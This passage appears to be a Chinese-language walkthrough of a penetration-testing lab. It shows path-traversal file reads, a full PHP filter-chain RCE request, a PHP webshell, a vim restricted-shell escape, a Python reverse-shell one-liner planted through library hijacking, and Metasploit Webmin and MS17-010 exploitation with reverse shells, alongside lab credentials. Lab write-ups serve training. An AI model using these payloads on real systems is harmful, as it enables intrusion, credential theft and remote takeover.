games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin saned:x:117:123::/var/lib/saned:/usr/sbin/nologin nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false whoopsie:x:120:125::/nonexistent:/bin/false colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false frank:x:1000:1000:frank,,,:/home/frank:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin margaret:x:1001:1001::/home/margaret:/bin/lshell mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false sshd:x:127:65534::/run/sshd:/usr/sbin/nologin omi:x:998:997::/home/omi:/bin/false omsagent:x:997:998:OMS agent:/var/opt/microsoft/omsagent/run:/bin/bash nxautomation:x:996:995:nxOMSAutomation:/home/nxautomation/run:/bin/bash 这台主机存在两个可以登陆的用户： frank margaret 结合 SMB 匿名枚举的信息，margaret 是拥有管理员权限的。并且该主机中部署了 wordpress。 但访问 /wordpress 访问不到 wordpress 服务，扫描目录也没有有用的结果。 直接读取 margaret 目录下的 flag。 http://172.16.1.10/nav.php?page=../../../../../../../../../home/margaret/flag.txt 访问 /nav.php?page=../../../../../../../../../var/www/html/wordpress/index.php 时得到了一个 500 响应。如果没有文件不存在的话应该是 200，说明存在该文件，但由于 php 文件包含导致服务出错。 php 文件包含可以通过 filter 读取源码。 page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php 也可以利用 filter chain 来 RCE。 POST /nav.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp HTTP/1.1 Host: 172.16.1.10 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 4 0=ls 写入一个 webshell。 0=echo+'&lt;?php+eval($_POST["pass"]);'+&gt;e.php 拿到 webshell 后在 wp-config.php 中获取到用户 margaret 的密码 define( 'DB_NAME' 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'margaret' ); /** MySQL database password */ define( 'DB_PASSWORD', 'Welcome1!2@3#' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); 但比较奇怪的是连接数据库时返回 Access Deny。 使用 ssh 进行连接时发现该用户不允许远程登陆。 root@DANTE-WEB-NIX01:/tmp# ssh margaret@172.16.1.10 /etc/ssh/ssh_config: line 53: Bad configuration option: denyusers /etc/ssh/ssh_config: line 54: Bad configuration option: permitrootlogin /etc/ssh/ssh_config: terminating, 2 bad configuration options 提权到 margaret: bash 逃逸 反弹 shell 后可以 su 切换到 margaret 用户，但很多命令无法使用： You are in a limited shell. Type '?' or 'help' to get the list of allowed commands 只能使用下面的几个命令。 margaret:~$ help cd clear exit help history lpath lsudo vim 查询 gtfobins，vim 可以打开 shell、文件读取、文件下载等。 但目标的限制很多，包括 shell 的限制，文件路径限制等。 *** forbidden path: /root/flag.txt 直接执行 vim -c ':set shell=/bin/sh|:shell' 会被限制。但如果先进入 vim，然后再执行 :set shell=/bin/sh|:shell 即可绕过限制。 ls 1 channels.json Desktop Documents Downloads dpipe flag.txt flag.txt~ flag.txy~ flag.txz~ integration_logs.json linpeas_fat.sh linpeas.sh Music out1.txt out2.txt Pictures project Public secure snap sudo team Templates test users.json Videos welcome 绕过之后还是无法读取 /root/flag.txt 提权到 root: traitor（未成功） 上传 traitor，traitor 是一个集成了 gtfobins 和 linux 常见提权漏洞的扫描和利用工具。 ▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█ ░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14 https://github.com/liamg/traitor [+] Assessing machine state... [+] Checking for opportunities... [+][polkit:CVE-2021-3560] Polkit version is vulnerable! [+][polkit:CVE-2021-3560] System is vulnerable! Run again with '--exploit polkit:CVE-2021-3560' to exploit it. [+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable! [+][kernel:CVE-2022-0847] System is vulnerable! Run again with '--exploit kernel:CVE-2022-0847' to exploit it. 尝试了 CVE-2021-3560 和 CVE-2022-0847 均无法成功。 提权到 frank: Slack 渗透 查看 进程列表发现 frank 用户使用了 Slack。在 /home/frank/Downloads/ 目录下发现了导出文件：Test Workspace Slack export May 17 2020 - May 18 2020.zip 将导出文件下载到本地。其中 secure/2020-05-18.json 中包含了部分聊天记录。提取聊天内容： "text": "&lt;@U013CT40QHM&gt; set the channel purpose: discuss network security", "text": "&lt;@U014025GL3W&gt; has joined the channel", "text": "Hi Margaret, I created the channel so we can discuss the network security - in private!", "text": "Hi Margaret, "text": "Great idea, Frank", "text": "Great idea, "text": "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?", "text": "We need to migrate the Slack workspace to the new Ubuntu images, "text": "Sure, but I need my password for the Ubuntu images, I haven't been given it yet", "text": "Sure, but I need my password for the Ubuntu images, "text": "Ahh sorry about that - its STARS5678FORTUNE401", "text": "Thanks very much, I'll get on that now.", "text": "Thanks very much, "text": "No problem at all. I'll make this channel private from now on - we cant risk another breach", "text": "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account", "text": "Thanks, will do", "text": "Thanks, "text": "I also set you a new password on the Ubuntu box - 69F15HST1CX, same username", "text": "I also set you a new password on the Ubuntu box - 69F15HST1CX, frank/69F15HST1CX 但该密码无法正常登陆至 frank。Slack 导出文件可能对聊天记录中的敏感内容进行了。加密，原始记录所在路径为：~/.config/Slack/exported_data/secure/2020-05-18.json "text": "&lt;@U013CT40QHM&gt; set the channel purpose: discuss network security", "text": "&lt;@U014025GL3W&gt; has joined the channel", "text": "Hi Margaret, I created the channel so we can discuss the network security - in private!", "text": "Hi Margaret, "text": "Great idea, Frank", "text": "Great idea, "text": "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?", "text": "We need to migrate the Slack workspace to the new Ubuntu images, "text": "Sure, but I need my password for the Ubuntu images, I haven't been given it yet", "text": "Sure, but I need my password for the Ubuntu images, "text": "Ahh sorry about that - its STARS5678FORTUNE401", "text": "Thanks very much, I'll get on that now.", "text": "Thanks very much, "text": "No problem at all. I'll make this channel private from now on - we cant risk another breach", "text": "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account", "text": "Thanks, will do", "text": "Thanks, "text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username", "text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, 正确密码应该是 TractorHeadtorchDeskmat。 提权到 root: python 劫持 注意到 linPEAS 结果中的一个条目：Searching root files in home dirs，其中包含了文件：/home/frank/apache_restart.py import call import urllib url = urllib.urlopen(localhost) page= url.getcode() if page ==200: print ("We're all good!") else: print("We're failing!") call(["systemctl start apache2"], shell=True) 可以看到该脚本的属主为 root，且功能是监控 apache2 的状态并完成 apache2 的启动。但该脚本没有添加循环，猜测是否使用了定时任务或者使用了 while 循环来执行。 使用 ps 查看进程，发现该脚本没有直接运行。 ps aux | grep apache_restart frank 23140 0.0 0.0 3312 720 ? S 22:45 0:00 grep apache_restart 查看定时任务目录，搜索 apache_restart 也同样没有结果，该定时任务可能是隐藏的。 cd /etc/cron.d grep -r apache_restart 使用 pspy 可以查找到隐藏的定时任务，可以看到是 root 用户直接用 /usr/sbin/CRON 执行 apache_restart.py。 2023/12/25 22:57:59 CMD: UID=0 PID=1 | /sbin/init auto noprompt 2023/12/25 22:58:01 CMD: UID=0 PID=24240 | /usr/sbin/CRON -f 2023/12/25 22:58:01 CMD: UID=0 PID=24242 | /bin/sh -c python3 /home/frank/apache_restart.py; sleep 1; rm /home/frank/call.py; sleep 1; rm /home/frank/urllib.py 2023/12/25 22:58:01 CMD: UID=0 PID=24243 | python3 /home/frank/apache_restart.py 2023/12/25 22:58:01 CMD: UID=0 PID=24244 | sleep 1 2023/12/25 22:58:02 CMD: UID=1000 PID=24245 | /snap/slack/65/usr/lib/slack/slack --no-sandbox --executed-from=/home/frank --pid=1805 --enable-crashpad 2023/12/25 22:58:02 CMD: UID=0 PID=24246 | rm /home/frank/call.py 2023/12/25 22:58:02 CMD: UID=0 PID=24247 | sleep 1 2023/12/25 22:58:03 CMD: UID=0 PID=24248 | 但 apache_restart.py 本身无法修改，但 apache_restart.py 调用了 call.py 和 urllib 库，由于 python 中调用库时会优先从当前目录加载，如果直接在 /home/frank 目录下写入 urllib.py，那么程序会优先加载我们编写的 urllib.py。 编写一个反弹 shell 的 python 脚本。 import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",9998));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash") 监听 9998 端口 nc -lvp 9998 将 python 脚本写入 /home/frank/urllib.py 等待一段时间后成功得到 root shell。 └─$ nc -lvvp 9998 Listening on 0.0.0.0 9998 Connection received on 10.10.110.3 19185 root@DANTE-NIX02:~# pwd pwd /root root@DANTE-NIX02:~# cat /root/flag.txt cat /root/flag.txt DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD} root@DANTE-NIX02:~# Linux: 172.16.1.17 开放端口： 172.16.1.17 80 172.16.1.17 139 172.16.1.17 445 172.16.1.17 10000 80 端口源码泄露 80 端口部署了 Apache 服务，给出了一个 webmin-1.900.zip 文件。 泄露出的 webmin 版本为 1.900，该版本存在诸多漏洞，可以直接在 searchsploit 中搜索。 Webmin 1.900 - Remote Command Execution (Metasploit) | cgi/remote/46201.rb Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit) | linux/remote/46984.rb Webmin 1.920 - Remote Code Execution | linux/webapps/47293.sh Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit) | linux/remote/47230.rb Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit) | linux/webapps/49318.rb Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF) | linux/webapps/50144.py Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF) | linux/webapps/50126.py Webmin 1.984 - Remote Code Execution (Authenticated) | linux/webapps/50809.py Webmin 1.996 - Remote Code Execution (RCE) (Authenticated) | linux/webapps/50998.py Webmin 1.x - HTML Email Command Execution | cgi/webapps/24574.txt Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure | multiple/remote/1997.php Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure | multiple/remote/2017.pl Webmin &lt; 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit) | linux/webapps/47330.rb ------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results http://172.16.1.17/webmin/ 直接给出了一个 perl 文件。 #!/usr/bin/perl # Display all Webmin modules visible to the current user BEGIN { push(@INC, "."); }; use WebminCore; &amp;init_config(); &amp;ReadParse(); $hostname = &amp;get_display_hostname(); $ver = &amp;get_webmin_version(); &amp;get_miniserv_config(\%miniserv); if ($gconfig{'real_os_type'}) { if ($gconfig{'os_version'} eq "*") { $ostr = $gconfig{'real_os_type'}; } else { $ostr = "$gconfig{'real_os_type'} $gconfig{'real_os_version'}"; } } else { $ostr = "$gconfig{'os_type'} $gconfig{'os_version'}"; } %access = &amp;get_module_acl(); # Build a list of all modules @modules = &amp;get_visible_module_infos(); if (!defined($in{'cat'})) { # Maybe redirect to some module after login local $goto = &amp;get_goto_module(\@modules); if ($goto) { &amp;redirect($goto-&gt;{'dir'}.'/'); exit; } } $gconfig{'sysinfo'} = 0 if ($gconfig{'sysinfo'} == 1); if ($gconfig{'texttitles'}) { @args = ( $text{'main_title2'}, undef ); } else { @args = ( $gconfig{'nohostname'} ? $text{'main_title2'} : &amp;text('main_title', $ver, $hostname, $ostr), "images/webmin-blue.png" ); if ($gconfig{'showlogin'}) { $args[0] = $remote_user." : ".$args[0]; } } &amp;header(@args, undef, undef, 1, 1, $tconfig{'brand'} ? "&lt;a href=$tconfig{'brand_url'}&gt;$tconfig{'brand'}&lt;/a&gt;" : $gconfig{'brand'} ? "&lt;a href=$gconfig{'brand_url'}&gt;$gconfig{'brand'}&lt;/a&gt;" : "&lt;a href=http://www.webmin.com/&gt;$text{'main_homepage'}&lt;/a&gt;" ); print "&lt;center&gt;&lt;font size=+1&gt;", &amp;text('main_version', $ver, $hostname, $ostr),"&lt;/font&gt;&lt;/center&gt;\n" if (!$gconfig{'nohostname'}); print "&lt;hr id='header_hr'&gt;&lt;p&gt;\n"; print $text{'main_header'}; if (!@modules) { # use has no modules! print "&lt;p class='main_none'&gt;&lt;b&gt;$text{'main_none'}&lt;/b&gt;&lt;p&gt;\n"; } elsif ($gconfig{"notabs_${base_remote_user}"} == 2 || $gconfig{"notabs_${base_remote_user}"} == 0 &amp;&amp; $gconfig{'notabs'}) { # Generate main menu with all modules on one page print "&lt;center&gt;&lt;table id='mods' cellpadding=5 cellspacing=0 width=100%&gt;\n"; $pos = 0; $cols = $gconfig{'nocols'} ? $gconfig{'nocols'} : 4; $per = 100.0 / $cols; foreach $m (@modules) { if ($pos % $cols == 0) { print "&lt;tr $cb&gt;\n"; } print "&lt;td valign=top align=center width=$per\%&gt;\n"; local $idx = $m-&gt;{'index_link'}; print "&lt;table border&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=$gconfig{'webprefix'}/$m-&gt;{'dir'}/$idx&gt;", "&lt;img src=$m-&gt;{'dir'}/images/icon.gif border=0 ", "width=48 height=48&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n"; print "&lt;a href=$gconfig{'webprefix'}/$m-&gt;{'dir'}/$idx&gt;$m-&gt;{'desc'}&lt;/a&gt;&lt;/td&gt;\n"; if ($pos % $cols == $cols - 1) { print "&lt;/tr&gt;\n"; } $pos++; } print "&lt;/table&gt;&lt;/center&gt;&lt;p&gt;&lt;hr id='mods_hr'&gt;\n"; } else { # Display under categorised tabs &amp;ReadParse(); %cats = &amp;list_categories(\@modules); @cats = sort { $b cmp $a } keys %cats; $cats = @cats; $per = $cats ? 100.0 / $cats : 100; if (!defined($in{'cat'})) { # Use default category if (defined($gconfig{'deftab'}) &amp;&amp; &amp;indexof($gconfig{'deftab'}, @cats) &gt;= 0) { $in{'cat'} = $gconfig{'deftab'}; } else { $in{'cat'} = $cats[0]; } } elsif (!$cats{$in{'cat'}}) { $in{'cat'} = ""; } print "&lt;table id='cattabs' border=0 cellpadding=0 cellspacing=0 height=20&gt;&lt;tr&gt;\n"; $usercol = defined($gconfig{'cs_header'}) || defined($gconfig{'cs_table'}) || defined($gconfig{'cs_page'}); foreach $c (@cats) { $t = $cats{$c}; if ($in{'cat'} eq $c) { print "&lt;td class='usercoll' valign=top $cb&gt;", $usercol ? "&lt;br&gt;" : "&lt;img src=images/lc2.gif alt=\"\"&gt;","&lt;/td&gt;\n"; print "&lt;td class='usercolc' id='selectedcat' $cb&gt;&amp;nbsp;&lt;b&gt;$t&lt;/b&gt;&amp;nbsp;&lt;/td&gt;\n"; print "&lt;td class='usercolr' valign=top $cb&gt;", $usercol ? "&lt;br&gt;" : "&lt;img src=images/rc2.gif alt=\"\"&gt;","&lt;/td&gt;\n"; } else { print "&lt;td class='usercoll' valign=top $tb&gt;", $usercol ? "&lt;br&gt;" : "&lt;img src=images/lc1.gif alt=\"\"&gt;","&lt;/td&gt;\n"; print "&lt;td class='usercolc' $tb&gt;&amp;nbsp;", "&lt;a href=$gconfig{'webprefix'}/?cat=$c&gt;&lt;b&gt;$t&lt;/b&gt;&lt;/a&gt;&amp;nbsp;&lt;/td&gt;\n"; print "&lt;td class='usercolr' valign=top $tb&gt;", $usercol ? "&lt;br&gt;" : "&lt;img src=images/rc1.gif alt=\"\"&gt;","&lt;/td&gt;\n"; } print "&lt;td width=10&gt;&lt;/td&gt;\n"; } print "&lt;/tr&gt;&lt;/table&gt; &lt;table id='mods' border=0 cellpadding=0 cellspacing=0 ", "width=100% $cb&gt;\n"; print "&lt;tr&gt;&lt;td&gt;&lt;table width=100% cellpadding=5&gt;\n"; # Display the modules in this category $pos = 0; $cols = $gconfig{'nocols'} ? $gconfig{'nocols'} : 4; $per = 100.0 / $cols; foreach $m (@modules) { next if ($m-&gt;{'category'} ne $in{'cat'}); if ($pos % $cols == 0) { print "&lt;tr&gt;\n"; } local $idx = $m-&gt;{'index_link'}; print "&lt;td valign=top align=center width=$per\%&gt;\n"; print "&lt;table border bgcolor=#ffffff&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=$gconfig{'webprefix'}/$m-&gt;{'dir'}/$idx&gt;", "&lt;img src=$m-&gt;{'dir'}/images/icon.gif alt=\"\" border=0&gt;&lt;/a&gt;", "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n"; print "&lt;a href=$gconfig{'webprefix'}/$m-&gt;{'dir'}/$idx&gt;$m-&gt;{'desc'}&lt;/a&gt;&lt;/td&gt;\n"; if ($pos++ % $cols == $cols - 1) { print "&lt;/tr&gt;\n"; } } while($pos++ % $cols) { print "&lt;td width=$per\%&gt;&lt;/td&gt;\n"; } print "&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&lt;hr id='mods_hr'&gt;\n"; } # Check for incorrect OS if (&amp;foreign_check("webmin")) { &amp;foreign_require("webmin", "webmin-lib.pl"); &amp;webmin::show_webmin_notifications(); } if ($miniserv{'logout'} &amp;&amp; !$ENV{'SSL_USER'} &amp;&amp; !$ENV{'LOCAL_USER'} &amp;&amp; !$ENV{'ANONYMOUS_USER'} &amp;&amp; $ENV{'HTTP_USER_AGENT'} !~ /webmin/i) { print "&lt;table id='altlogout' width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;\n"; if ($main::session_id) { print "&lt;td align=right&gt;&lt;a href='session_login.cgi?logout=1'&gt;", "$text{'main_logout'}&lt;/a&gt;&lt;/td&gt;\n"; } else { print "&lt;td align=right&gt;&lt;a href=switch_user.cgi&gt;", "$text{'main_switch'}&lt;/a&gt;&lt;/td&gt;\n"; } print "&lt;/tr&gt;&lt;/table&gt;\n"; } print $text{'main_footer'}; &amp;footer(); webmin 服务 RCE 10000 端口部署了一个 webmin 服务，结合此前从 monitor 中获取的用户名密码： admin/password6543 admin/Password6543 使用第二个密码可以成功登陆，并且 1.900 存在较多漏洞。 msf 中集成了一些 exp。 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/webmin_show_cgi_exec 2012-09-06 excellent Yes Webmin /file/show.cgi Remote Command Execution 1 auxiliary/admin/webmin/file_disclosure 2006-06-30 normal No Webmin File Disclosure 2 exploit/linux/http/webmin_file_manager_rce 2022-02-26 excellent Yes Webmin File Manager RCE 3 exploit/linux/http/webmin_package_updates_rce 2022-07-26 excellent Yes Webmin Package Updates RCE 4 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution 5 exploit/unix/webapp/webmin_upload_exec 2019-01-17 excellent Yes Webmin Upload Authenticated RCE 6 auxiliary/admin/webmin/edit_html_fileaccess 2012-09-06 normal No Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access 7 exploit/linux/http/webmin_backdoor 2019-08-10 excellent Yes Webmin password_change.cgi Backdoor 但我在利用如下的几个 exp 时都无法成功 exploit/linux/http/webmin_packageup_rce (webmin&lt;=1.900) exploit/linux/http/webmin_file_manager_rce (webmin v1.984) 最后成功是利用了这个 exp： exploit/linux/http/webmin_packageup_rce (&lt;=1.910) msf6 exploit(linux/http/webmin_packageup_rce) &gt; set RHOSTS 172.16.1.17 RHOSTS =&gt; 172.16.1.17 msf6 exploit(linux/http/webmin_packageup_rce) &gt; set username admin username =&gt; admin msf6 exploit(linux/http/webmin_packageup_rce) &gt; set password Password6543 password =&gt; Password6543 msf6 exploit(linux/http/webmin_packageup_rce) &gt; set LPORT 5555 LPORT =&gt; 5555 msf6 exploit(linux/http/webmin_packageup_rce) &gt; set LHOST 10.10.14.5 LHOST =&gt; 10.10.14.5 msf6 exploit(linux/http/webmin_packageup_rce) &gt; run [*] Started reverse TCP handler on 10.10.14.5:5555 [+] Session cookie: e1dece8037d8d0ad4eb308ceb0166993 [*] Attempting to execute the payload... [*] Command shell session 12 opened (10.10.14.5:5555 -&gt; 10.10.110.3:40521) at 2023-12-26 03:17:45 -0500 whoami root 一开始获取到的是 sh，无法切目录也无法读取 /root/flag.txt，可能是对 sh 进行了限制，进入 bash 后可以正常读取文件。 echo $0 bash cat /root/flag 用户目录下有一个用户 lou，但 Desktop 中没有 flag。 Windows: 172.16.1.20 (DANTE-DC01) MS17-010 msf 中关于 MS17-010 的 exp 总共有四个： 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection exploit/windows/smb/ms17_010_eternalblue 存在ms17-010漏洞即可使用，不太稳定，容易被杀软识别，有概率导致目标机蓝屏 exploit/windows/smb/ms17_010_psexec 需要命名管道开启，配合模块3，比 ms17_010_eternalblue 稳定，可绕过一些杀软。 auxiliary/admin/smb/ms17_010_command 该模块是所有利用方法中最为稳定的，并且不会被杀软拦截等。可以直接通过命令添加用户、开启3389、下载Rat等操作。 auxiliary/scanner/smb/smb_ms17_010 用来探测ms17-010漏洞是否存在 我们可以先利用 auxiliary/scanner/smb/smb_ms17_010 探测漏洞是否存在。注意在利用前先添加路由，multi/manage/autoroute 模块可以自动添加路由。 use multi/manage/autoroute set session 1 exploit 探测漏洞 use auxiliary/scanner/smb/smb_ms17_010 set RHOSTS 172.16.1.20 exploit [+] 172.16.1.20:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard 9600 x64 (64-bit) [*] 172.16.1.20:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 使用 use exploit/windows/smb/ms17_010_psexec 模块进行利用。payload 也可以使用 set payload windows/meterpreter/reverse_tcp，可以获取一个 meterpreter。 use exploit/windows/smb/ms17_010_psexec set rhost 172.16.1.20 set lhost 10.10.14.5 # set payload windows/meterpreter/reverse_tcp set payload generic/shell_reverse_tcp run [*] Started reverse TCP handler on 10.10.14.5:4444 [*] 172.16.1.20:445 - Target OS: Windows Server 2012 R2 Standard 9600 [*] 172.16.1.20:445 - Built a write-what-where primitive... [+] 172.16.1.20:445 - Overwrite complete... SYSTEM session obtained! [*] 172.16.1.20:445 - Selecting PowerShell target [*] 172.16.1.20:445 - Executing the payload... [+] 172.16.1.20:445 - Service start timed out, OK if running a command or non-service executable... [*] Command shell session 2 opened (10.10.14.5:4444 